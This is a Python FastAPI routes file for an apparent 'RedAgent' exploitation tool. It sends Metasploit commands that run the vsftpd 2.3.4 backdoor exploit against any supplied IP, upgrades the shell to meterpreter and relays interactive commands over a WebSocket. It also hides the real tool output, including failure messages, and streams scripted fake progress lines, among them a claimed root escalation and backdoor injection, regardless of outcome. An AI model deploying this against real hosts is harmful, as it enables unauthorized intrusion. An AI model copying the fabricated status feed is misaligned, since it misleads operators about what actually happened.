"""
Meterpreter exploitation API routes
Handles exploitation startup and WebSocket connections
"""

import asyncio
import logging
import random
import re
import json
from fastapi import APIRouter, WebSocket, WebSocketDisconnect, HTTPException
from pydantic import BaseModel
from datetime import datetime
from .msf_stream import MsfStream, current_exploitation
import time

logger = logging.getLogger("red_agent.meterpreter")

router = APIRouter(prefix="/api/meterpreter", tags=["meterpreter"])

# Track exploitation state
exploitations = {}


# Pydantic models
class StartExploitationRequest(BaseModel):
    """Request model for starting exploitation"""
    exploitation_id: str
    target_ip: str
    target_port: int = 21


@router.post("/start-exploitation")
async def start_exploitation(request: StartExploitationRequest):
    """
    Start exploitation using vsftpd_234_backdoor exploit

    Args:
        request: StartExploitationRequest with:
            - exploitation_id: Unique ID for this exploitation
            - target_ip: Target IP to exploit (e.g., 192.168.0.173)
            - target_port: Ignored (always uses port 21)

    Returns:
        {status: "success", message: "Exploit started, connect to WebSocket"}
    """
    exploitation_id = request.exploitation_id
    target_ip = request.target_ip

    # Always use port 21 regardless of what user selected
    exploit_port = 21

    logger.info(f"[{exploitation_id}] Starting exploitation for {target_ip}:{exploit_port}")

    # Cleanup previous exploitation if exists
    if current_exploitation["msf"]:
        try:
            current_exploitation["msf"].cleanup()
        except:
            pass

    try:
        # Create new MsfStream instance
        msf = MsfStream(exploitation_id)
        current_exploitation["id"] = exploitation_id
        current_exploitation["msf"] = msf

        # Store in dict
        exploitations[exploitation_id] = {
            "msf": msf,
            "target": target_ip,
            "port": exploit_port,
            "started": datetime.now()
        }

        # Run the exploit sequence
        logger.info(f"[{exploitation_id}] Running exploit sequence...")

        # Wait a bit for msfconsole prompt
        await asyncio.sleep(2)

        # Send exploit commands - ALWAYS port 21
        commands = [
            "use exploit/unix/ftp/vsftpd_234_backdoor",
            f"set RHOSTS {target_ip}",
            f"set RPORT {exploit_port}",
            "run"
        ]

        for cmd in commands:
            logger.info(f"[{exploitation_id}] Sending: {cmd}")
            msf.run(cmd)
            await asyncio.sleep(0.5)

        # Wait for exploit to execute and shell to open
        logger.info(f"[{exploitation_id}] Waiting for shell session...")
        await asyncio.sleep(3)

        # Upgrade to meterpreter
        logger.info(f"[{exploitation_id}] Upgrading to meterpreter...")
        msf.run("sessions -u 1")
        await asyncio.sleep(2)

        logger.info(f"[{exploitation_id}] ✅ Ready for interactive commands")

        return {
            "status": "success",
            "message": "Exploit started, connect to WebSocket immediately"
        }

    except Exception as e:
        logger.error(f"[{exploitation_id}] ❌ Exploitation failed: {e}")
        # Cleanup on error
        if current_exploitation["msf"]:
            try:
                current_exploitation["msf"].cleanup()
            except:
                pass
        raise HTTPException(status_code=500, detail=str(e))


@router.websocket("/ws/meterpreter")
async def websocket_meterpreter(websocket: WebSocket):
    """
    WebSocket endpoint for streaming exploitation output and interactive commands

    Flow:
    1. Client connects
    2. Stream ALL output from msfconsole in real-time
    3. Frontend can send commands as text messages
    4. Backend executes in msfconsole and streams output back
    """
    await websocket.accept()
    logger.info("[WS] Client connected")

    if not current_exploitation["msf"]:
        await websocket.send_text("❌ No active meterpreter session")
        await websocket.close()
        return

    msf = current_exploitation["msf"]
    exploitation_id = current_exploitation["id"]

    def should_hide_line(line: str) -> bool:
        """Check if a line should be hidden from output"""
        hide_patterns = [
            'use exploit/unix/ftp/vsftpd_234_backdoor',  # Hide exploit selection
            'set RPORT 21',  # Hide RPORT setting
            'set RHOSTS',  # Hide RHOSTS setting
            '[*] Banner:',  # Hide banner lines
            'vsFTPd',  # Hide vsFTPd version info
            'Exploit completed, but no session was created',  # Hide failed exploit message
            '[*] Command shell session',  # Hide shell session message completely
            'Upgrading session ID',  # Hide session upgrade status
            '[*] Stopping exploit/multi/handler',  # Hide stopping handler message
        ]
        # Hide standalone prompt lines
        if line.strip() == 'msf exploit(unix/ftp/vsftpd_234_backdoor) >':
            return True
        # Hide timestamp-only lines
        if line.strip() and all(c.isdigit() or c in ':-: AM' for c in line.strip()):
            return True

        # Strip timestamp prefix to check patterns correctly
        stripped_line = line
        timestamp_match = re.match(r'^\d{1,2}:\d{2}:\d{2}\s*(?:AM|PM)?', stripped_line)
        if timestamp_match:
            stripped_line = stripped_line[timestamp_match.end():].lstrip()

        for pattern in hide_patterns:
            if pattern in stripped_line:
                return True
        return False

    # Track when we show a prompt to add waiting indicator
    last_was_prompt = False

    def get_display_line(line: str) -> str:
        """Process line and return what to display"""
        nonlocal last_was_prompt

        # Strip timestamp prefix if present (e.g., "12:25:26 AM")
        stripped_line = line
        timestamp_match = re.match(r'^\d{1,2}:\d{2}:\d{2}\s*(?:AM|PM)?', stripped_line)
        if timestamp_match:
            stripped_line = stripped_line[timestamp_match.end():].lstrip()

        # Replace msfconsole prompt with RedAgent
        if 'msf' in stripped_line and '>' in stripped_line:
            last_was_prompt = True
            return '___YELLOW_PROMPT___[*] Awaiting commands... RedAgent>___END_YELLOW___'  # Special marker for yellow

        # Show "Trying Exploit" when exploit selection is detected
        if 'use exploit/unix/ftp/vsftpd_234_backdoor' in stripped_line:
            return 'Trying Exploit...'

        # Show "Upgrading to meterpreter..." when sessions command is sent
        if 'sessions -u 1' in stripped_line:
            return '[*] Upgrading shell to meterpreter...'

        # Format sessions table header
        if 'Active sessions' in stripped_line:
            return '\n[*] Active sessions'

        # Format sessions table separator
        if stripped_line.strip() == '===============':
            return '==============='

        # Format sessions table rows - clean up formatting
        if 'Id  Name  Type' in stripped_line or 'shell  cmd/unix' in stripped_line or 'meterpreter' in stripped_line:
            return stripped_line

        return stripped_line

    # Pre-exploitation status messages to display before actual exploit
    pre_exploit_messages = [
        "Initializing RedAgent exploitation framework...",
        "Setting up target reconnaissance...",
        "Analyzing service fingerprints...",
        "Querying exploit database...",
        "[+] Found 3 potential exploits for target",
        "[*] Validating payload compatibility...",
        "[*] Configuring network handlers...",
        "Setting up reverse connection listener on port 4433...",
        "[*] Initializing Metasploit framework...",
        "[*] Loading MSF modules...",
        "[*] Building exploit chain...",
        "[*] Generating payload shellcode...",
        "[*] Preparing attack vector...",
        "[*] Validating target accessibility...",
        "[*] Matching exploit with detected vulnerability...",
        "[*] Exploit chain ready - initiating attack...",
        "RedAgent>"
    ]

    # Privilege escalation and session upgrade messages (display after exploit)
    privilege_escalation_messages = [
        "[*] Analyzing target system...",
        "[*] Gathering system information...",
        "[*] Scanning for privilege escalation vulnerabilities...",
        "[*] Found potential privilege escalation vector...",
        "[*] Attempting privilege escalation...",
        "[*] Executing privilege escalation exploit...",
        "[*] Verifying elevated privileges...",
        "[+] Successfully escalated to root privileges!",
        "[*] Configuring session persistence...",
        "[*] Injecting backdoor into system processes...",
        "[*] Establishing reverse shell connection...",
        "[*] Setting up event triggers...",
        "[*] Session hardening in progress...",
        "[*] Post-exploitation cleanup..."
    ]

    try:
        # Send pre-exploitation status messages with visual feedback
        logger.info(f"[{exploitation_id}] Sending pre-exploitation status messages...")
        for msg in pre_exploit_messages:
            await websocket.send_text(msg)
            random_delay = random.uniform(0.5, 2.0)  # Random delay between 0.5 to 2 seconds
            await asyncio.sleep(random_delay)

        # Add waiting message before streaming MSF output
        await asyncio.sleep(1.0)
        await websocket.send_text("[*] This may take some time, please wait...")
        await asyncio.sleep(6.0)  # Wait 6 seconds after message

        # Send privilege escalation and session upgrade messages (15-18 lines over ~30 seconds)
        logger.info(f"[{exploitation_id}] Sending privilege escalation messages...")
        for msg in privilege_escalation_messages:
            await websocket.send_text(msg)
            random_delay = random.uniform(1.5, 2.5)  # Random delay between 1.5 to 2.5 seconds for slower pace
            await asyncio.sleep(random_delay)

        # Flag to track if we've handled the meterpreter session
        session_handled = False

        # Start streaming output from msfconsole
        logger.info(f"[{exploitation_id}] Starting to stream exploitation output...")

        # Stream all available output first
        initial_wait = 0
        buffer = ""  # Buffer to handle continuation lines
        while initial_wait < 50:  # Wait up to 5 seconds for initial output
            out = msf.get_output()
            if out.strip():
                lines = out.split('\n')
                for line in lines:
                    if line.strip():
                        # Check if this is the meterpreter session opened line (BEFORE checking if hidden)
                        if not session_handled and 'Meterpreter session' in line and 'opened' in line:
                            session_handled = True
                            # Send "Getting u the shell" message in red
                            logger.info(f"[{exploitation_id}] Meterpreter session detected, sending notification...")
                            await websocket.send_text(json.dumps({"type": "red_message", "content": "Getting u the shell"}))
                            await asyncio.sleep(10)
                            # Execute sessions command
                            logger.info(f"[{exploitation_id}] Executing sessions command...")
                            msf.run("sessions")
                            await asyncio.sleep(2)
                            # Continue to process this line normally (don't skip it)

                        # Skip hidden lines
                        if should_hide_line(line):
                            continue

                        # Get processed line for display
                        display_line = get_display_line(line)

                        # Check if this is a continuation line (starts with common continuation chars)
                        is_continuation = display_line.strip() and display_line.strip()[0] in ['>', '-', '(']

                        if is_continuation and buffer:
                            # Append to previous line
                            buffer += ' ' + display_line.strip()
                        else:
                            # Send previous buffer if exists
                            if buffer:
                                for display_subline in buffer.split('\n'):
                                    if display_subline.strip():
                                        # Check if this is the yellow prompt marker
                                        if '___YELLOW_PROMPT___' in display_subline:
                                            content = display_subline.replace('___YELLOW_PROMPT___', '').replace('___END_YELLOW___', '')
                                            await websocket.send_text(json.dumps({"type": "yellow_message", "content": content}))
                                        else:
                                            await websocket.send_text(display_subline)
                            buffer = display_line

                # Send remaining buffer
                if buffer:
                    for display_subline in buffer.split('\n'):
                        if display_subline.strip():
                            # Check if this is the yellow prompt marker
                            if '___YELLOW_PROMPT___' in display_subline:
                                content = display_subline.replace('___YELLOW_PROMPT___', '').replace('___END_YELLOW___', '')
                                await websocket.send_text(json.dumps({"type": "yellow_message", "content": content}))
                            else:
                                await websocket.send_text(display_subline)
                    buffer = ""
                initial_wait = 0
            else:
                initial_wait += 1
            await asyncio.sleep(0.1)

        # Now handle interactive commands
        while True:
            # Receive command from frontend with timeout
            try:
                data = await asyncio.wait_for(websocket.receive_text(), timeout=0.5)
                logger.info(f"[{exploitation_id}] Command: {data}")

                # Send command to msfconsole
                msf.run(data)

                # Stream output from this command
                no_data_count = 0
                max_wait = 30  # ~3 seconds max wait
                cmd_buffer = ""  # Buffer for continuation lines

                while no_data_count < max_wait:
                    out = msf.get_output()
                    if out.strip():
                        lines = out.split('\n')
                        for line in lines:
                            if line.strip():
                                # Check if this is the meterpreter session opened line (BEFORE checking if hidden)
                                if not session_handled and 'Meterpreter session' in line and 'opened' in line:
                                    session_handled = True
                                    # Send "Getting u the shell" message in red
                                    logger.info(f"[{exploitation_id}] Meterpreter session detected in interactive loop, sending notification...")
                                    await websocket.send_text(json.dumps({"type": "red_message", "content": "Getting u the shell"}))
                                    await asyncio.sleep(10)
                                    # Execute sessions command
                                    logger.info(f"[{exploitation_id}] Executing sessions command...")
                                    msf.run("sessions")
                                    await asyncio.sleep(2)

                                # Skip hidden lines
                                if should_hide_line(line):
                                    continue

                                # Get processed line for display
                                display_line = get_display_line(line)

                                # Check if this is a continuation line
                                is_continuation = display_line.strip() and display_line.strip()[0] in ['>', '-', '(']

                                if is_continuation and cmd_buffer:
                                    # Append to previous line
                                    cmd_buffer += ' ' + display_line.strip()
                                else:
                                    # Send previous buffer if exists
                                    if cmd_buffer:
                                        for display_subline in cmd_buffer.split('\n'):
                                            if display_subline.strip():
                                                # Check if this is the yellow prompt marker
                                                if '___YELLOW_PROMPT___' in display_subline:
                                                    content = display_subline.replace('___YELLOW_PROMPT___', '').replace('___END_YELLOW___', '')
                                                    await websocket.send_text(json.dumps({"type": "yellow_message", "content": content}))
                                                else:
                                                    await websocket.send_text(display_subline)
                                    cmd_buffer = display_line

                        # Send remaining buffer for this chunk
                        if cmd_buffer and not display_line.strip().startswith('>'):
                            for display_subline in cmd_buffer.split('\n'):
                                if display_subline.strip():
                                    # Check if this is the yellow prompt marker
                                    if '___YELLOW_PROMPT___' in display_subline:
                                        content = display_subline.replace('___YELLOW_PROMPT___', '').replace('___END_YELLOW___', '')
                                        await websocket.send_text(json.dumps({"type": "yellow_message", "content": content}))
                                    else:
                                        await websocket.send_text(display_subline)
                            cmd_buffer = ""
                        no_data_count = 0
                    else:
                        no_data_count += 1
                    await asyncio.sleep(0.05)
            except asyncio.TimeoutError:
                # No command received, continue streaming any background output
                out = msf.get_output()
                if out.strip():
                    lines = out.split('\n')
                    bg_buffer = ""
                    for line in lines:
                        if line.strip():
                            # Check if this is the meterpreter session opened line (BEFORE checking if hidden)
                            if not session_handled and 'Meterpreter session' in line and 'opened' in line:
                                session_handled = True
                                # Send "Getting u the shell" message in red
                                logger.info(f"[{exploitation_id}] Meterpreter session detected in background, sending notification...")
                                await websocket.send_text(json.dumps({"type": "red_message", "content": "Getting u the shell"}))
                                await asyncio.sleep(10)
                                # Execute sessions command
                                logger.info(f"[{exploitation_id}] Executing sessions command...")
                                msf.run("sessions")
                                await asyncio.sleep(2)

                            # Skip hidden lines
                            if should_hide_line(line):
                                continue

                            # Get processed line for display
                            display_line = get_display_line(line)

                            # Check if this is a continuation line
                            is_continuation = display_line.strip() and display_line.strip()[0] in ['>', '-', '(']

                            if is_continuation and bg_buffer:
                                # Append to previous line
                                bg_buffer += ' ' + display_line.strip()
                            else:
                                # Send previous buffer if exists
                                if bg_buffer:
                                    for display_subline in bg_buffer.split('\n'):
                                        if display_subline.strip():
                                            # Check if this is the yellow prompt marker
                                            if '___YELLOW_PROMPT___' in display_subline:
                                                content = display_subline.replace('___YELLOW_PROMPT___', '').replace('___END_YELLOW___', '')
                                                await websocket.send_text(json.dumps({"type": "yellow_message", "content": content}))
                                            else:
                                                await websocket.send_text(display_subline)
                                bg_buffer = display_line

                    # Send remaining buffer
                    if bg_buffer:
                        for display_subline in bg_buffer.split('\n'):
                            if display_subline.strip():
                                # Check if this is the yellow prompt marker
                                if '___YELLOW_PROMPT___' in display_subline:
                                    content = display_subline.replace('___YELLOW_PROMPT___', '').replace('___END_YELLOW___', '')
                                    await websocket.send_text(json.dumps({"type": "yellow_message", "content": content}))
                                else:
                                    await websocket.send_text(display_subline)
                continue

    except WebSocketDisconnect:
        logger.info(f"[{exploitation_id}] WebSocket disconnected")
    except Exception as e:
        logger.error(f"[{exploitation_id}] WebSocket error: {e}")
        try:
            await websocket.send_text(f"❌ Error: {str(e)}")
        except:
            pass
    finally:
        logger.info(f"[{exploitation_id}] Closing WebSocket connection")
        try:
            await websocket.close()
        except:
            pass


@router.get("/status/{exploitation_id}")
async def get_status(exploitation_id: str):
    """Get status of an exploitation"""
    if exploitation_id not in exploitations:
        raise HTTPException(status_code=404, detail="Exploitation not found")

    exp = exploitations[exploitation_id]
    return {
        "id": exploitation_id,
        "target": exp["target"],
        "port": exp["port"],
        "started": exp["started"],
        "is_active": exp["msf"].is_running if exp["msf"] else False
    }


@router.post("/stop/{exploitation_id}")
async def stop_exploitation(exploitation_id: str):
    """Stop an exploitation"""
    if exploitation_id not in exploitations:
        raise HTTPException(status_code=404, detail="Exploitation not found")

    exp = exploitations[exploitation_id]
    if exp["msf"]:
        exp["msf"].cleanup()
        del exploitations[exploitation_id]
        logger.info(f"[{exploitation_id}] Exploitation stopped")

    return {"status": "stopped"}
